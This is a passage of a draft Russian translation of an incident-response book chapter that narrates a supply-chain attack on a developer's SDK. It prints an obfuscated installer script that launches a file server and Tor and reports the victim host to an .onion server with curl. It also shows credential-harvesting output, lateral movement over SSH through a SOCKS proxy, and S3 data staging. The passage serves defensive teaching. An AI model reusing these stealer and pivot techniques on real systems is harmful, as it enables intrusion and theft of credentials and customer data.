---
book_id: dynamic-incident-response-joshua-wright-en-2026
chapter_number: 1
source_title: "Case Study: Supply Chain Calamity"
source_pdf_page_range: "27-43"
rag_chunk_range:
  first: "dynamic-incident-response-joshua-wright-en-2026:p0027:c01"
  last: "dynamic-incident-response-joshua-wright-en-2026:p0043:c01"
translation_status: "DRAFT_FOR_QA"
license_notice: "Неофициальный русский перевод / unofficial Russian translation; original work CC BY 4.0. См. ../ATTRIBUTION.md."
third_party_review_flags:
  - "Figure 3 visual asset: THIRD_PARTY_REVIEW_REQUIRED"
  - "Figure 4 visual asset: THIRD_PARTY_REVIEW_REQUIRED"
  - "Figure 5 visual asset: THIRD_PARTY_REVIEW_REQUIRED"
  - "Figure 6 visual asset: THIRD_PARTY_REVIEW_REQUIRED"
translation_notes:
  - "Canonical English RAG is source of truth."
  - "Команды, код, пути, URL, идентификаторы и технические литералы сохранены verbatim."
  - "RAG не содержит самостоятельных multimodal-объектов фигур; переведены только поддержанные RAG подписи/ссылки."
---

# Глава 1. Кейс: катастрофа в цепочке поставок

## ДЖОРДАН

К 9:30 утра Джордан уже хотелось, чтобы этот день закончился. Утро началось с неудачного входа с многофакторной аутентификацией (MFA), из-за чего ей пришлось звонить в службу поддержки, чтобы разобраться с проблемой. Затем посыпалась серия писем от менеджера проекта, который срочно собирал всех на внеплановый stand-up, чтобы обсудить последний интеграционный проект с устаревшим логистическим провайдером Gilded Freight. Никто не сделал Джордан скидку на опоздание из-за проблемы с MFA. Менеджер проекта уже вошёл в темп и расписывал сроки и результаты проекта. NovaRise была хорошим местом для работы, но Джордан уже хотелось передышки.

Джордан работала в команде NovaFlow — платформы, которая использовала аналитику в реальном времени и машинное обучение для оптимизации маршрутов доставки, а также прогнозирования задержек и формирования отчётов о них. Подобные решения существовали и раньше, но NovaFlow разработала технологию, которая позволяла почти мгновенно пересчитывать маршруты при изменении условий перевозки. Для небольших компаний, которые не могли позволить себе счёт AWS в 100 000 долларов в месяц за решения корпоративного уровня, это было серьёзным преимуществом.

Собственный алгоритм NovaFlow был той самой «секретной приправой», которая отличала компанию от конкурентов и позволяла ей быстро отвоёвывать долю рынка при доступной стоимости. Интеграция очередного устаревшего логистического провайдера должна была ещё больше расширить охват NovaRise и позволить компании начать теснить крупных игроков рынка.

Джордан почти не участвовала в обсуждении общих бизнес-целей. Как архитектор облачных решений, она занималась backend-инфраструктурой и следила за тем, чтобы платформа масштабировалась вместе с ростом нагрузки. Обычно это не создавало проблем — за исключением интеграций со сторонними поставщиками.

NovaFlow была построена на микросервисной архитектуре, поэтому новые функции и сервисы подключались достаточно легко. Основную тяжёлую работу брали на себя облачные инфраструктурные сервисы, однако команда зависела от сторонних поставщиков специализированных услуг: геолокации, прогнозов погоды, данных о трафике и отслеживания перевозчиков. Большую часть дня Джордан устраняла проблемы интеграции, обновляла API и контролировала производительность сервисов. Она уже неплохо научилась брать нелепо спроектированные API от поставщиков Software-as-a-Service (SaaS) и заставлять их работать в архитектуре NovaFlow. В компании именно к Джордан обращались, когда нужно было втиснуть плохо продуманный API в RESTful-архитектуру.

Последним интеграционным проектом Джордан был Gilded Freight — старый логистический провайдер. Чтобы упростить переход, Джордан поручили заставить API Gilded Freight работать с backend NovaFlow. API Gilded был ужасен, но Джордан видела и хуже.

API Gilded представлял собой мешанину SOAP- и RESTful-сервисов с несколькими бессмысленными endpoint’ами в придачу — настоящий пережиток начала 2000-х. В основном он возвращал смесь XML- и JSON-ответов, а несколько endpoint’ов отдавали CSV. После того как Джордан разобралась с endpoint’ами — при фактически отсутствующей документации, большое спасибо — её работа позволила выполнить интеграцию сервисов Gilded простым переносом lift-and-shift.

Джордан отслеживала возникающие при переходе проблемы и параллельно писала документацию в Confluence и unit-тесты, чтобы будущим «Джордан» не пришлось разбираться с тем же хаосом. Но когда она попыталась запустить контейнер для dev API endpoint на порту 8080, день внезапно стал ещё сложнее.

### Листинг 2. Ошибка запуска Docker-контейнера

```
jm@jm ~/novaflow-lemonlime feature/gilded-unittest ↓1
% sudo docker run --rm -it -h novaflow --name novaflow -p 8080:80  novaflow-lemonlime-4.31
docker: Error response from daemon: driver failed programming external connectivity on endpoint
novaflow (babb2294b756a177abfaa9252c21ce3432dc611cf3500621d1e1b6b74450c222): failed to bind port
0.0.0.0:8080/tcp: Error starting userland proxy: listen tcp4 0.0.0.0:8080: bind: address already
in use. ①
```

① Docker не может привязаться к порту 8080, потому что его уже использует другой процесс.

Джордан некоторое время смотрела на ошибку. Сопоставление локального порта 8080 с портом 80 контейнера должно было сработать без ошибок. Она проверила список процессов, чтобы понять, что использует порт 8080.

### Листинг 3. Проверка деталей прослушиваемого порта

```
jm@jm /novaflow-lemonlime feature/gilded-unittest ↓1
% ss -natp | grep LISTEN | grep 8080
LISTEN    0      1024         127.0.0.1:8080          0.0.0.0:*    users:(("ms",pid=18450,fd=9))
①
```

① Процесс `ms` слушает порт 8080 и имеет PID 18450.

Джордан вспомнила шутку: Linux дружелюбен к пользователю, но очень придирчив к выбору друзей. Процесс `ms` мог быть чем угодно, но выглядел как веб-сервер на порту 8080, работающий на локальном loopback-интерфейсе. Это означало, что доступ к `127.0.0.1:8080` был только у процессов на этой машине. Джордан проверила процесс с PID 18450.

### Листинг 4. Проверка деталей процесса

```
jm@jm /novaflow-lemonlime feature/gilded-unittest ↓1
% ps -f 18450
UID          PID    PPID  C STIME TTY      STAT   TIME CMD
jm         18450   18449  0 16:34 pts/2    Sl     0:00 /opt/gilded/SDK/setup/ms -i 127.0.0.1 -p
8080 -HUu / /
```

Процесс `ms` был частью SDK Gilded Freight. Забавно: раньше Джордан этого не замечала. Она проверила родительский процесс с PID 18449.

### Листинг 5. Проверка родительского процесса

```
jm@jm /novaflow-lemonlime feature/gilded-unittest ↓1
% ps -f 18449
UID          PID    PPID  C STIME TTY      STAT   TIME CMD
jm         18449   17829  0 16:34 pts/2    S      0:00 /bin/bash ./gilded-sdk-update --upgrade
```

Родительским процессом для `ms` оказался скрипт `gilded-sdk-update`. Джордан видела этот скрипт в составе SDK Gilded, но не понимала, что он всё ещё выполняется. Она поискала другие процессы, связанные со скриптом обновления.

### Листинг 6. Проверка связанных процессов

```
jm@jm /novaflow-lemonlime feature/gilded-unittest ↓1
% ps --ppid 18449 -f
UID          PID    PPID  C STIME TTY          TIME CMD
jm         18450   18449  0 16:34 pts/2    00:00:00 /opt/gilded/SDK/setup/ms -i 127.0.0.1 -p
8080 -H /
jm         18451   18449  1 16:34 pts/2    00:00:00 /opt/gilded/SDK/setup/ssupd -f
/opt/gilded/SDK/setup/ssupd.rc --quiet
```

У `gilded-sdk-update` было два дочерних процесса: `ms` и `ssupd`. По наитию Джордан проверила прослушиваемые порты для всех трёх имён процессов.

### Листинг 7. Прослушиваемые порты, отфильтрованные по процессам SDK Gilded

```
jm@jm /novaflow-lemonlime feature/gilded-unittest ↓1
% ss -natp | grep LISTEN | grep -E "ms|ssupd|gilded-sdk-update"
LISTEN 0      4096           0.0.0.0:9150          0.0.0.0:*    users:(("ssupd",pid=18451,fd=6))
①
LISTEN 0      1024         127.0.0.1:8080          0.0.0.0:*    users:(("ms",pid=18450,fd=9)) ②
```

① Процесс `ssupd` слушает порт 9150, привязанный ко всем интерфейсам (`0.0.0.0`).  
② Процесс `ms` слушает порт 8080, привязанный к локальному loopback-интерфейсу (`127.0.0.1`).

Это уже выглядело плохо. Процесс `ssupd` слушал порт 9150 на всех интерфейсах. В отличие от `ms`, привязанного к `127.0.0.1`, к этому сервису могли подключаться другие машины.

Джордан это не понравилось. Было непонятно, что именно делает `ssupd`, но причин для его работы на локальной машине она не видела. Возможно, ответы даст ранее обнаруженный shell-скрипт `gilded-sdk-update`.

### Листинг 8. Скрипт обновления SDK Gilded

```
jm@jm /novaflow-lemonlime feature/gilded-unittest ↓1
% cat /opt/gilded/SDK/setup/gilded-sdk-update
z="
";uBz='ttcp';Hz='T/se';sz='USER';Cz='pt/g';GCz='2gej';DBz='| tr';hBz='me=$';ECz='tofc';Jz='ms
-';ICz='vyd.';Tz='eblo';OBz=' -x ';eBz='\';GBz=')';Sz='mp/w';mBz='sswo';az=' $RO';jBz='
"us';PBz='sock';QBz='s5h:';QCz='D';nBz='rd=$';nz='HOST';rBz='OLEN';WBz='--da';iBz='" \';Qz=' /
/';oBz='
"st';ABz='T/lo';kBz='er=$';Az='ROOT';jz='DPID';HBz='PASS';vBz='2jl6';gz='quie';Iz='tup/';Pz='-
HUu';BCz='5vwc';bz='OT/s';mz='p 10';Dz='ilde';ez='pd.r';Vz='&1 &';aBz='
"on';tBz='://d';YBz='rlen';EBz=' -d
';TBz='9150';rz='ame)';Ez='d/SD';IBz='WORD';wBz='ated';CCz='tcbp';PCz='PDPI';DCz='m2zn';uz='hoam
';ZBz='code';sBz='http';Kz='i 12';NBz='curl';Uz='g
2>';BBz='gs/h';HCz='5omm';Gz='$ROO';KBz='STOL';lBz='
"pa';oz='NAME';SBz='0.1:';xz='N=$(';FBz='\''\n'\''';VBz='-G \';yz='cat
';OCz='$SSU';LCz='wait';qBz='=$ST';ACz='esuv';dz='/ssu';cz='etup';Mz='0.1 ';hz='t
&';bBz='ion=';pz='=$(h';Yz='ssup';Rz=' >/t';tz='=$(w';XBz='ta-
u';Bz='="/o';wz='ONIO';gBz='stna';yBz='osyz';Nz='-p 8';FCz='76wb';fBz='
"ho';iz='SSUP';RBz='//12';Xz='D=$!';JCz='onio';qz='ostn';vz='i)';lz='slee';kz='=$!';LBz='EN=f';F
z='K"';JBz='=""';Oz='080 ';pBz='olen';dBz='ON" ';UBz=' \';NCz='PID ';MCz=' $MS';CBz='ame
';Lz='7.0.';MBz='alse';fz='c --';Zz='d -f';xBz='zlgc';KCz='n';Wz='MSPI';cBz='$ONI';
[...]
```

Джордан не понимала, что именно происходит в этом выводе, кроме одного: всё выглядело крайне подозрительно. Как никто не сделал ей скидку за опоздание на stand-up, так и она понимала, что менеджер проекта не обрадуется задержкам. Значит, пора было возвращаться к работе.

### Листинг 9. Завершение процессов

```
jm@jm /novaflow-lemonlime feature/gilded-unittest ↓1
% killall ms ssupd gilded-sdk-update
jm@jm /novaflow-lemonlime feature/gilded-unittest ↓1
% ps -ef | grep -E "ssupd|gilded|ms"
jm         18529   16891  0 16:41 pts/0    00:00:00 grep --color=auto -E ssupd|gilded|ms
```

Джордан завершила процессы `ms`, `ssupd` и `gilded-sdk-update`. Несколько проверок в течение дня показали, что они больше не запускались.

После короткого раздумья Джордан сделала ещё один шаг очистки.

### Листинг 10. Удаление дерева SDK

```
jm@jm /novaflow-lemonlime feature/gilded-unittest ↓1
% sudo rm -fr /opt/gilded/
jm@jm /novaflow-lemonlime feature/gilded-unittest ↓1
%
```

После остановки listener’а TCP/8080 и удаления кода SDK Джордан смогла запустить Docker-контейнер и вернуться к работе.

## PYRIX

В шестистах милях от неё в консоли стилера Pyrix появилось уведомление: подключилась новая рабочая станция.

Пока другие сосредотачивались на поиске клиентов, Pyrix предпочитал, чтобы клиенты приходили к нему сами. У него был отработанный процесс:

- найти SDK или библиотеку, достаточно популярную, но не слишком популярную;
- просканировать ресурсы поставщика SDK и найти VPN-, SSH- или другие endpoint’ы аутентификации;
- использовать credential stuffing и password spraying для получения доступа — либо купить доступ у брокера;
- провести перечисление ресурсов и повышение привилегий, чтобы получить доступ к репозиториям Source Code Management (SCM);
- добавить код стилера в SDK;
- ждать входящих подключений.

Этот процесс был намеренно неторопливым: скорость приносилась в жертву масштабу и повторяемости. Подход уже хорошо работал, прежде всего против разработчиков на Linux и macOS. Windows EDR создавали слишком много проблем. Зачем рисковать из-за мониторинга Windows endpoint’ов, если можно целиться в разработчиков с Linux- и macOS-машинами?

На этот раз Pyrix выбрал Gilded Freight — транспортную компанию, превратившуюся в крупного технологического игрока. В обмен на какой-то имевшийся у него код Pyrix убедил своего initial access broker (IAB) поделиться VPN-учётными данными offshore-разработчика Gilded Freight. Затем надёжная уязвимость Jenkins дала доступ к SCM. Теперь можно было внедрять стилер.

Pyrix посмеивался над усилиями других атакующих, которые пытались избегать обнаружения с помощью раздутых клиентских стилеров. «Когда добавляешь 50 МБ мусора и тысячу библиотек — конечно, тебя поймают». Pyrix предпочитал минималистичный подход.

Вместо того чтобы встраивать в SDK всю логику кражи данных, Pyrix добавил в Linux-скрипт установки SDK две основные функции:

1. минимальный веб-сервер, использующий корень файловой системы как web root;
2. скрытый сервис Tor для анонимного удалённого доступа и сетевого туннелирования.

Веб-сервером был MiniServe — минимальный сервер, позволявший легко раздавать содержимое файловой системы. Pyrix использовал набор правил поиска и замены, чтобы изменить строки в исходном коде MiniServe, после чего скомпилировал новый бинарник для обхода простых сигнатурных проверок. Tor обеспечивал анонимизацию трафика, а веб-сервер был доступен только локально. Переименование клиента Tor в `ssupd` придавало ему вид легитимности без дополнительных усилий.

Конфигурация Tor превращала стилер во что-то большее, чем просто файловый браузер. Pyrix настроил `ssupd.rc` на публикацию скрытого сервиса с двумя портами: один был сопоставлен с MiniServe для доступа к файловой системе, другой — с собственным SOCKS-listener’ом Tor. Привязав SOCKS-порт ко всем интерфейсам (`0.0.0.0:9150`) вместо стандартного localhost, Pyrix сделал так, чтобы тот же процесс Tor работал одновременно как сетевой pivot и SOCKS-прокси. Через SOCKS-порт скрытого сервиса он мог маршрутизировать произвольные TCP-соединения через рабочую станцию жертвы во внутреннюю сеть, где она находилась. SSH, подключения к базам данных, API-вызовы — всё, что было доступно с рабочей станции, становилось доступно и Pyrix.

Оставалось только написать shell-скрипт, который запускает сервисы и уведомляет серверную часть стилера.

### Листинг 11. Shell-скрипт запуска стилера

```
> cat gilded-sdk-update-orig
#!/bin/bash
ROOT="/opt/gilded/SDK"
$ROOT/setup/ms -i 127.0.0.1 -p 8080 -HUu / / >/tmp/weblog 2>&1 &
MSPID=$!
$ROOT/setup/ssupd -f $ROOT/setup/ssupd.rc --quiet &
SSUPDPID=$!
sleep 10
HOSTNAME=$(hostname)
USER=$(whoami)
ONION=$(cat $ROOT/logs/hostname | tr -d '\n')
PASSWORD=""
STOLEN=false
# Notify Onions Stealer
curl -x socks5h://127.0.0.1:9150 \
    -G \
    --data-urlencode "onion=$ONION" \
    --data-urlencode "hostname=$HOSTNAME" \
    --data-urlencode "user=$USER" \
    --data-urlencode "password=$PASSWORD" \
    --data-urlencode "stolen=$STOLEN" \
    http://dttcp2jl6atedzlgcosyzesuv5vwctcbpm2zntofc76wb2gej5ommvyd.onion
wait $MSPID $SSUPDPID
```

cURL использовал прокси жертвы, чтобы отправить уведомление серверному стилеру через Tor. С помощью `bash-obfuscate` Pyrix изменил скрипт, усложнив его чтение.

### Листинг 12. Обфускация Bash-скрипта

```
> bash-obfuscate gilded-sdk-update-orig -o gilded-sdk-update
> head -2 gilded-sdk-update
z="
";uBz='ttcp';Hz='T/se';sz='USER';Cz='pt/g';GCz='2gej';DBz='| tr';hBz='me=$';ECz='tofc';Jz='ms
-';ICz='vyd.';Tz='eblo';OBz=' -x ';eBz='\';GBz=')';Sz='mp/w';mBz='sswo';az=' $RO';jBz='
"us';PBz='sock';QBz='s5h:';QCz='D';nBz='rd=$';nz='HOST';rBz='OLEN';WBz='--da';iBz='" \';Qz=' /
/';oBz='
"st';ABz='T/lo';kBz='er=$';Az='ROOT';jz='DPID';HBz='PASS';vBz='2jl6';gz='quie';Iz='tup/';Pz='-
HUu';BCz='5vwc';bz='OT/s';mz='p 10';Dz='ilde';ez='pd.r';Vz='&1 &';aBz='
"on';tBz='://d';YBz='rlen';EBz=' -d
';TBz='9150';rz='ame)';Ez='d/SD';IBz='WORD';wBz='ated';CCz='tcbp';PCz='PDPI';DCz='m2zn';uz='hoam
';ZBz='code';sBz='http';Kz='i 12';NBz='curl';Uz='g
2>';BBz='gs/h';HCz='5omm';Gz='$ROO';KBz='STOL';lBz='
"pa';oz='NAME';SBz='0.1:';xz='N=$(';FBz='\''\n'\''';VBz='-G \';yz='cat
';OCz='$SSU';LCz='wait';qBz='=$ST';ACz='esuv';dz='/ssu';cz='etup';Mz='0.1 ';hz='t
&';bBz='ion=';pz='=$(h';Yz='ssup';Rz=' >/t';tz='=$(w';XBz='ta-
u';Bz='="/o';wz='ONIO';gBz='stna';yBz='osyz';Nz='-p 8';FCz='76wb';fBz='
"ho';iz='SSUP';RBz='//12';Xz='D=$!';JCz='onio';qz='ostn';vz='i)';lz='slee';kz='=$!';LBz='EN=f';F
z='K"';JBz='=""';Oz='080 ';pBz='olen';dBz='ON" ';UBz=' \';NCz='PID ';MCz=' $MS';CBz='ame
';Lz='7.0.';MBz='alse';fz='c --';Zz='d -f';xBz='zlgc';KCz='n';Wz='MSPI';cBz='$ONI';
```

Изменение установочного скрипта позволяло Pyrix разворачивать стилер во время новых установок или обновлений SDK Gilded Freight. Когда жертвы устанавливали SDK, стилер запускался и отправлял уведомление на сервер Pyrix.

### Рисунок 3. Консоль уведомлений серверного стилера

`THIRD_PARTY_REVIEW_REQUIRED` — визуальный объект отсутствует как самостоятельный multimodal RAG-объект; в переводе сохранена только подпись и смысловая ссылка на него.

Каждая запись на сервере была связана с клиентским onion-URL, что позволяло Pyrix анонимно просматривать файловую систему жертвы.

### Рисунок 4. Представление файловой системы жертвы в MiniServe

`THIRD_PARTY_REVIEW_REQUIRED` — визуальный объект отсутствует как самостоятельный multimodal RAG-объект; в переводе сохранена только подпись и смысловая ссылка на него.

Получив доступ к файловой системе жертвы, Pyrix мог просматривать и скачивать любые интересующие его файлы. Благодаря MiniServe запрос к endpoint `/upload` с параметром `path` также позволял произвольно загружать файлы на машину. Для единичных действий этого было достаточно, но настоящая выгода заключалась в автоматизации.

### Листинг 13. Скрипты серверного стилера

```
> ls
adduser.py
chrome-stealer.py
db-connection.py
decrypter.py
firefox-stealer.py
harvesterer.py
recon.py
status.py
stealer-wip.py
stealer.py
> ./stealer-wip.py
Usage: stealer-wip.py <http://foo.onion:port>
```

### Листинг 14. Серверный стилер

```
> python stealer-wip.py
"http://k4gxda7puozk22obbsus6mpa6ilzfknjso7r6pe57iwukiaajfzmf6qd.onion:8080"
connecting to http://k4gxda7puozk22obbsus6mpa6ilzfknjso7r6pe57iwukiaajfzmf6qd.onion:8080
connected. walking /home|/Users|/root
done. found 3 directories.
walking /home/jm
   + Checking processes
   + Checking ssh

   - Found ssh keys:

  /home/jm/.ssh/id_rsa
  /home/jm/.ssh/id_rsa.pub

   + Checking sudo
     - Found sudo_as_admin_successful
   + Checking shell
     - Found credentials:

  mysql -u root -pdr0wssaP nfdev-01

   + Checking less
   + Checking vim
   + Checking gdb
   + Checking mysql
   + Checking sqlite
   + Checking browser
   + Checking python
   + Checking pwsh
   + Checking aws
     - Found aws credentials:

  [default]
  aws_access_key_id = AKIA5IYSSAFAJXZEPZPZ
  aws_secret_access_key = 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

   + Checking azure
   + Checking gcp
   + Checking do
   + Checking oracle
   + Checking firebase
  [...]
```

Pyrix откинулся назад, довольный результатом. SSH-ключи, root-пароль к базе MySQL и AWS credentials. Три пути внутрь сети — и всё это с одной рабочей станции разработчика.

Пора было приступать к работе.

## Латеральное перемещение

Pyrix начал с SSH-ключей. Рабочие станции разработчиков почти всегда имели SSH-доступ к внутренним системам, а ключи уже лежали на месте и ждали своего часа.

Стилер уже скачал приватный ключ Джордан и файл `known_hosts` через MiniServe. Теперь Pyrix использовал второй порт скрытого сервиса — SOCKS-прокси — чтобы туннелировать SSH-соединения через рабочую станцию Джордан во внутреннюю сеть NovaRise. С точки зрения Pyrix это был всего лишь ещё один переход через прокси. С точки зрения внутренних серверов соединения исходили от рабочей станции Джордан.

### Листинг 15. Латеральное перемещение по SSH через SOCKS-прокси

```
> python recon.py --proxy
socks5h://k4gxda7puozk22obbsus6mpa6ilzfknjso7r6pe57iwukiaajfzmf6qd.onion:1081 --key
/tmp/loot/jm_id_rsa --known-hosts /tmp/loot/jm_known_hosts ①
loading key /tmp/loot/jm_id_rsa
parsing known_hosts: 4 entries
routing through socks proxy...

 + jm@nfdev-01.internal.novarise.io -- connected ②
 + jm@nfdev-02.internal.novarise.io -- connected ③
 + jm@staging-api.internal.novarise.io -- timeout
 + jm@ci-runner.internal.novarise.io -- connected ④

3/4 hosts accessible.
```

① SSH-соединения маршрутизируются через SOCKS-прокси скрытого сервиса Tor на рабочей станции жертвы.  
② Основной сервер разработки.  
③ Вторичный сервер разработки.  
④ CI/CD runner с доступом к build pipeline.

Три из четырёх хостов в `known_hosts` Джордан приняли украденный ключ. В журналах внутренних серверов эти соединения выглядели как поступившие с IP-адреса рабочей станции Джордан и не отличались от её обычной активности разработчика.

Главной целью были серверы разработки. Общие dev-среды почти всегда содержат соединения с базами данных, внутреннюю документацию и дополнительные credentials в конфигурационных файлах.

### Листинг 16. Сбор credentials на сервере разработки

```
> python recon.py --proxy
socks5h://k4gxda7puozk22obbsus6mpa6ilzfknjso7r6pe57iwukiaajfzmf6qd.onion:1081 --ssh jm@nfdev-
01.internal.novarise.io --harvest
connecting via SOCKS proxy and SSH key...
connected to nfdev-01.internal.novarise.io

 + Checking environment variables
   - Found DATABASE_URL: mysql://nfapp:Pr0dR3adOnly!@db-prod.internal.novarise.io:3306/novaflow
①
 + Checking config files
   - Found /opt/novaflow/config/production.yml
   - Found /opt/novaflow/.env.production
 + Checking shell history
   - Found aws s3 commands referencing: novarise-customer-data, novarise-algo-assets ②
 + Checking docker configs
   - Found docker-compose.yml with service credentials
 + Checking git remotes
   - Found gitlab remote: git@gitlab.internal.novarise.io:novaflow/novaflow-core.git ③

Harvested 14 credentials from nfdev-01.
```

① Строка подключения к production-базе с read-only credentials.  
② Имена S3 bucket’ов, указывающие на клиентские данные и активы алгоритма.  
③ Внутренний GitLab-репозиторий основного приложения NovaFlow.

Четырнадцать credentials с одного сервера разработки. Pyrix даже не понадобилось повышать привилегии. Разработчики сами хранили production credentials в переменных окружения, конфигурационных файлах и shell history — Pyrix был только рад этому.

CI/CD runner тоже оказался полезен. Build pipeline часто используют credentials сервисных учётных записей для развёртывания production-сред, а конфигурационные файлы runner’а содержали дополнительные AWS access keys.

## Pivot в облако

Pyrix не торопился. Он начал с AWS credentials Джордан на рабочей станции и выполнил базовое перечисление ресурсов, чтобы понять структуру среды.

### Листинг 17. Перечисление AWS-среды

```
> vi ~/.aws/credentials
> aws sts get-caller-identity
{
    "UserId": "AIDA5IYSSAFAJXZEPZPZ",
    "Account": "847203551429",
    "Arn": "arn:aws:iam::847203551429:user/jmorales" ①
}
> aws s3 ls
2024-08-14 09:23:17 novarise-customer-data ②
2024-11-02 14:07:33 novarise-algo-assets ③
2025-01-15 08:45:22 novarise-prod-backups
2025-02-28 16:33:41 novarise-dev-artifacts
2025-03-10 11:12:09 novarise-logs-archive
2025-03-22 09:55:48 novarise-ml-training-data
```

① Подтверждена IAM identity Джордан.  
② Bucket с клиентскими данными.  
③ Bucket с активами алгоритма, содержащий собственный алгоритм маршрутизации NovaFlow.

Шесть S3 bucket’ов. Два из них совпадали со ссылками, найденными Pyrix в shell history на сервере разработки. Одни только имена достаточно ясно говорили о содержимом.

### Листинг 18. Перечисление содержимого S3 bucket’ов

```
> aws s3 ls s3://novarise-customer-data --recursive --human-readable --summarize
[...]
2025-04-01 00:15:03    1.2 GiB exports/customer-shipping-2025-Q1.csv.gz
2025-04-01 00:15:47  892.4 MiB exports/customer-contacts-2025-Q1.csv.gz
2025-04-01 00:16:22  445.7 MiB exports/order-history-2025-Q1.csv.gz

Total Objects: 847
     Total Size: 34.8 GiB ①

> aws s3 ls s3://novarise-algo-assets --recursive --human-readable --summarize
[...]
2025-03-28 16:42:11   12.4 MiB models/novaflow-routing-v4.2.pkl
2025-03-28 16:42:15    8.7 MiB src/routing-engine-core.tar.gz ②
2025-03-28 16:42:18    3.1 MiB src/ml-pipeline-config.tar.gz

Total Objects: 23
     Total Size: 156.3 MiB
```

① 34,8 GiB данных о доставках и контактах клиентов.  
② Исходный код собственного алгоритма маршрутизации NovaFlow.

Данные о клиентских доставках, контактная информация и история заказов. Исходный код алгоритма. Всё это лежало в S3 bucket’ах, к которым учётная запись разработчика имела read access.

### Рисунок 5. Скомпрометированные активы NovaRise

`THIRD_PARTY_REVIEW_REQUIRED` — визуальный объект отсутствует как самостоятельный multimodal RAG-объект; в переводе сохранена только подпись и смысловая ссылка на него.

## Экcфильтрация

Pyrix не усложнял. Endpoint `/upload` MiniServe на рабочей станции жертвы давал ему канал обратно в onion-сеть, но для массового переноса данных он предпочитал работать прямо из облака. Используя украденные credentials Джордан, он запустил небольшой EC2 instance с публичным IP и собственным SSH-ключом, получив прямой доступ, независимый от инфраструктуры стилера. Затем скопировал целевые файлы на instance и забрал подготовленные архивы на свою машину по SSH.

### Листинг 19. Подготовка данных

```
[ec2-user@ip-10-0-47-12 ~]$ aws s3 cp s3://novarise-algo-assets/src/routing-engine-core.tar.gz
/tmp/staging/
download: s3://novarise-algo-assets/src/routing-engine-core.tar.gz to /tmp/staging/routing-
engine-core.tar.gz

[ec2-user@ip-10-0-47-12 ~]$ aws s3 cp s3://novarise-customer-data/exports/customer-shipping-
2025-Q1.csv.gz /tmp/staging/
download: s3://novarise-customer-data/exports/customer-shipping-2025-Q1.csv.gz to
/tmp/staging/customer-shipping-2025-Q1.csv.gz

[ec2-user@ip-10-0-47-12 ~]$ aws s3 cp s3://novarise-customer-data/exports/customer-contacts-
2025-Q1.csv.gz /tmp/staging/
download: s3://novarise-customer-data/exports/customer-contacts-2025-Q1.csv.gz to
/tmp/staging/customer-contacts-2025-Q1.csv.gz
```

Три файла: алгоритм маршрутизации, записи о доставках клиентов и контактная информация клиентов. Pyrix забрал архивы по SSH и проверил содержимое.

Исходный код алгоритма оказался чистым и хорошо документированным. Кто-нибудь за него заплатит. Клиентские данные содержали имена, адреса, телефонные номера и историю доставки более чем 200 000 клиентов NovaRise. Для такого набора данных был другой тип покупателя.

Pyrix обновил консоль стилера, отметил запись NovaRise как обработанную и перешёл к следующей жертве в очереди. Вся операция — от первоначального уведомления до эксфильтрации — заняла меньше суток. К тому моменту, когда Джордан заметила конфликт на порту 8080 и завершила процессы, Pyrix уже закончил работу. Её действия отрезали стилеру доступ к рабочей станции, но украденные данные и независимо работающий EC2 instance уже были вне её контроля.

## СЭМ

Сэм дежурил уже третий спокойный день, когда в его очередь попал ticket. Шесть лет работы в security operations научили его серьёзно относиться к каждому обращению, даже низкоприоритетному. Этот ticket был отнесён к категории `SOFTWARE_ISSUE` и создан архитектором облачных решений по имени Джордан. В нём говорилось, что SDK установил на её рабочую станцию неожиданные фоновые процессы. Джордан отметила, что уже завершила их и удалила SDK, а после события шесть дней была полностью занята интеграционным проектом.

Сэм работал методично и был обучен модели PICERL, на которой основывался процесс реагирования на инциденты его команды. Что-то в этих процессах SDK его насторожило. Он начал с короткого звонка Джордан, чтобы понять, что именно она наблюдала.

Джордан восстановила хронологию: конфликт на порту 8080, процессы `ms` и `ssupd`, странный shell-скрипт и действия по завершению процессов и удалению каталога SDK. Она сказала, что после завершения процессов больше их не видела. Сэм поблагодарил её и начал расследование.

## Идентификация

Первым шагом Сэм проверил рабочую станцию Джордан. Он подключился удалённо и поискал запущенные процессы с именами, которые она описала.

### Листинг 20. Проверка процессов на рабочей станции Джордан

```
sam@jm-workstation ~
$ ps -ef | grep -E "ms|ssupd|gilded"
sam        21847   21832  0 10:14 pts/1    00:00:00 grep --color=auto -E ms|ssupd|gilded
$ ls -la /opt/gilded/
ls: cannot access '/opt/gilded/': No such file or directory ①
$ ss -natp | grep -E "8080|9150"
$ ②
```

① Каталог SDK был удалён.  
② На этих портах нет слушающих процессов.

Чисто. Ни запущенных процессов, ни каталога SDK, ни прослушиваемых портов. Джордан тщательно убрала непосредственную угрозу. Сэм отметил это в ticket и перешёл к системным журналам в поисках исторических свидетельств.

### Листинг 21. Проверка системного журнала

```
sam@jm-workstation ~
$ journalctl --since "6 days ago" | grep -i "gilded\|ssupd\|ms.*8080"
Apr 07 16:34:02 jm-workstation bash[18449]: Started /bin/bash ./gilded-sdk-update --upgrade
Apr 07 16:34:03 jm-workstation ms[18450]: listening on 127.0.0.1:8080
Apr 07 16:34:04 jm-workstation ssupd[18451]: opening SOCKS listener on 0.0.0.0:9150 ①
Apr 07 16:41:18 jm-workstation systemd[1]: Stopped target session scope for jm (18449)
Apr 07 16:41:18 jm-workstation systemd[1]: Stopped target session scope for jm (18450)
Apr 07 16:41:18 jm-workstation systemd[1]: Stopped target session scope for jm (18451) ②
[...]
```

① Процесс `ssupd` открыл SOCKS-listener на порту 9150.  
② Все три процесса завершились в 16:41, что соответствует команде `killall` Джордан.

Журналы подтвердили рассказ Джордан. Три процесса стартовали в 16:34 и были завершены в 16:41, когда она выполнила `killall`. Сэм отметил семиминутное окно между запуском и завершением. Он также отметил SOCKS-listener на порту 9150, что соответствовало поведению Tor-прокси. Это была интересная деталь для анонимизированной исходящей сетевой активности, но она не стала центром его основного расследования.

Сэм проверил сетевые журналы рабочей станции Джордан за эти семь минут.

### Листинг 22. Проверка сетевого журнала

```
sam@jm-workstation ~
$ journalctl --since "Apr 07 16:34" --until "Apr 07 16:42" | grep -i "connect\|network\|tcp"
Apr 07 16:34:08 jm-workstation ssupd[18451]: connection established to guard relay
Apr 07 16:34:14 jm-workstation ssupd[18451]: circuit built
Apr 07 16:34:22 jm-workstation ssupd[18451]: SOCKS connection from 127.0.0.1:44892
Apr 07 16:34:24 jm-workstation curl[18465]: connected to 127.0.0.1:9150
[...]
```

В этом окне была некоторая сетевая активность, но сейчас ничего активного не наблюдалось. Сэм убедился, что необычных исходящих соединений в данный момент нет. Сетевая активность рабочей станции выглядела нормально для машины разработчика: соединения с package repository, API-трафик к облачным сервисам и обычная активность браузера.

## Сдерживание

